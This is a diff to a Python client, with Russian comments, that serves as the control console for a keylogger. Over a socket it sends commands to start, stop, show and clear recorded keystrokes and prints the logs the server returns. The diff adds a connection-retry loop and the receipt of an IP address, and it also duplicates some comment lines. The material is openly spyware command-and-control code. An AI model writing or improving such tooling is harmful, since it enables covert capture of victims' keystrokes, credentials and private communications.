@@ -2,6 +2,7 @@ import socket
 import struct
 import pickle
 import os
+import time
 
 # Глобальная переменная для сокета
 client_socket = None
@@ -102,6 +103,7 @@ def send_command(command):
 
 
 # Основное меню клиента
+# Основное меню клиента
 def client_menu():
     while True:
         print("\n1. Start keylogger")
@@ -121,11 +123,10 @@ def client_menu():
             send_command("keylogger_stop")
             logs = client_socket.recv(1024).decode('utf-8')
             print("Keylogger stopped.")
-        elif choice == '3':  # Show logs
+        elif choice == '3':
             send_command("keylogger_show")
-            logs = client_socket.recv(1024).decode('utf-8')  # Получаем логи от сервера
+            logs = client_socket.recv(1024).decode('utf-8')
             print("Logs from server:\n" + logs)
-
         elif choice == '4':
             send_command("keylogger_clear")
             logs = client_socket.recv(1024).decode('utf-8')
@@ -142,13 +143,27 @@ def client_menu():
         else:
             print("Invalid choice. Please try again.")
 
-
+# Запуск клиента
 # Запуск клиента
 if __name__ == "__main__":
     try:
         # Открытие сокета
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect(('localhost', 8080))
+
+        while True:
+            try:
+                client_socket.connect(('localhost', 8080))
+                print("Connected to server.")
+                break
+            except ConnectionRefusedError:
+                print("Server not available, retrying...")
+                time.sleep(1)  # Подождите перед повторной попыткой подключения
+
+        # Получение IP-адреса клиента от сервера
+        ip_address = client_socket.recv(1024).decode('utf-8')
+        print("Server sent:", ip_address)
+
+        # После получения IP-адреса можно продолжить
         client_menu()
     except Exception as e:
         print("An error occurred while connecting to the server: {}".format(e))
